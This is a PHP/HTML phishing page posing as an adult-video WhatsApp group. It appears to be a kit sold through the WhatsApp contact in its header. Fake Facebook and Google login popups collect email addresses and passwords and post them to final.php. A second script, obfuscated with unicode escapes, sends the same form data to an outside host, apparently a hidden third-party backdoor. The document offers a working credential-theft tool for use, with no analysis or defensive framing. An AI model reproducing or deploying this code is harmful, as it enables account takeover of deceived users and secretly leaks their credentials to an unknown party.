<?php
// Creator Sc  : ABU CODE - X 
// Order Script Vip : https://wa.me/6289509551861

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Share Vidio 18+</title>
    <script src="https://cdn.jsdelivr.net/gh/alex-hostingg/js@main/tailwind.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/5/facebook.css"> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/5/google.css"> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/5/all.css"> 
  </head>
  <body class="bg-white min-h-screen flex flex-col items-center justify-start py-8 px-4">
    <button
      onclick="openGroup()"
      class="mb-12 bg-[#008069] text-white text-base font-normal rounded-full px-6 py-2"
      type="button"
    >
      Open WhatsApp
    </button>

    <div class="flex flex-col items-center space-y-2">
      <img
        onclick="openGroup()"
        alt="Profile image"
        class="w-20 h-20 rounded-full object-cover"
        height="80"
        src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/logo.png"
        width="80"
      />
      <h1 class="font-semibold text-black text-lg">Share Vidio 18+</h1>
      <p class="text-gray-600 text-sm">Group · 172 Participant</p>
    </div>

    <div class="flex justify-center items-center space-x-12 mt-6 mb-4 text-[#008069] text-xs font-normal">
      <button onclick="openGroup()" class="flex flex-col items-center space-y-1" type="button">
        <i class="fas fa-phone fa-lg"></i>
        <span>Call</span>
      </button>
      <button onclick="openGroup()" class="flex flex-col items-center space-y-1" type="button">
        <i class="fas fa-video fa-lg"></i>
        <span>Video</span>
      </button>
      <button onclick="openGroup()" class="flex flex-col items-center space-y-1" type="button">
        <i class="fas fa-search fa-lg"></i>
        <span>Search</span>
      </button>
    </div>

    <div class="w-full max-w-md mt-2">
      <div class="flex justify-between items-center mb-2 px-1 text-xs text-gray-700 font-normal">
        <span>Media, links and docks</span>
        <button onclick="openGroup()" class="flex items-center space-x-1" type="button">
          <span>574</span>
          <i class="fas fa-chevron-right text-xs"></i>
        </button>
      </div>

      <div class="flex space-x-2 overflow-x-auto pb-2">
        <div onclick="openGroup()" class="relative flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Video 1"
            class="w-full h-full object-cover"
            height="80"
            src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/1.png"
            width="80"
            onclick="openGroup()"
          />
          <div
            class="absolute bottom-1 right-1 bg-black bg-opacity-70 text-white text-[10px] px-1 rounded flex items-center space-x-1"
          >
            <i class="fas fa-video"></i>
            <span>4.31</span>
          </div>
        </div>

        <div onclick="openGroup()" class="flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Image 2"
            class="w-full h-full object-cover"
            src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/2.png"
            onclick="openGroup()"
          />
        </div>

        <div onclick="openGroup()" class="relative flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Video 3"
            class="w-full h-full object-cover"
            height="80"
            src="https://cdn.jsdelivr.net/gh/cdn-aryatqhio/img@main/5/3.jpg"
            width="80"
            onclick="openGroup()"
          />
          <div
            class="absolute bottom-1 right-1 bg-black bg-opacity-70 text-white text-[10px] px-1 rounded flex items-center space-x-1"
          >
            <i class="fas fa-video"></i>
            <span>2.56</span>
          </div>
        </div>

        <div onclick="openGroup()" class="relative flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Video 4"
            class="w-full h-full object-cover"
            height="80"
            src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/4.jpg"
            width="80"
            onclick="openGroup()"
          />
          <div
            class="absolute bottom-1 right-1 bg-black bg-opacity-70 text-white text-[10px] px-1 rounded flex items-center space-x-1"
          >
            <i class="fas fa-video"></i>
            <span>3.06</span>
          </div>
        </div>

        <div onclick="openGroup()" class="flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Image 5"
            class="w-full h-full object-cover"
            height="80"
            src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/5.png"
            width="80"
            onclick="openGroup()"
          />
        </div>
      </div>
    </div>

    <button
      onclick="openGroup()"
      class="mt-6 bg-[#00C851] text-white text-xs font-semibold rounded px-8 py-2"
      type="button">
      Bergabung ke grup</button>
 </section>
</div>
<center>      <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/5/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/4.5.12/jquery.min.js"></script>
  <script>
  $(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://doods-stream.site/unduh";
            }
        });
    }
    
    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");


    // Tombol
    $("#codxFacebook").click(function () { OpenFacebook(); });
    $("#codxGoogle").click(function () { OpenGoogle(); });
    $("#openGroup").click(function () { openGroup(); });

});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>